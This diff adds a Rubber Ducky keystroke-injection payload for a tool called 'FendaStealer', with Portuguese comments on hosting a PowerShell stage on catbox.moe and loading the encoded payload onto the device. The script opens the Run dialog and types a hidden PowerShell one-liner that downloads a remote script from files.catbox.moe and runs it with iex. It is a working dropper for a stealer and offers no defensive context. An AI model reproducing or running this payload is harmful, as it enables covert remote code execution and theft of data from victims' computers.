@@ -1,0 +1,17 @@
+REM FendaStealer - payload TESTE (--test) - EXEMPLO (troque pela SUA url do stage)
+REM
+REM Como usar:
+REM   1) Suba o stage no catbox:
+REM      curl -F "reqtype=fileupload" -F "fileToUpload=@stage_aes_test.ps1" https://catbox.moe/user/api.php
+REM   2) Substitua SUA_URL_STAGE.ps1 pelo link retornado (ex.: https://files.catbox.moe/XXXX.ps1)
+REM   3) No Payload Studio selecione Keyboard Layout = Portuguese (Brazil) / ABNT2
+REM   4) Encode -> inject.bin -> microSD do Rubber Ducky
+DELAY 1200
+GUI r
+DELAY 2500
+STRING powershell -nop -w hidden -c "$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');iex($w.DownloadString('https://files.catbox.moe/SUA_URL_STAGE.ps1'))"
+DELAY 600
+ENTER
+DELAY 1200
+ENTER
+DELAY 10000
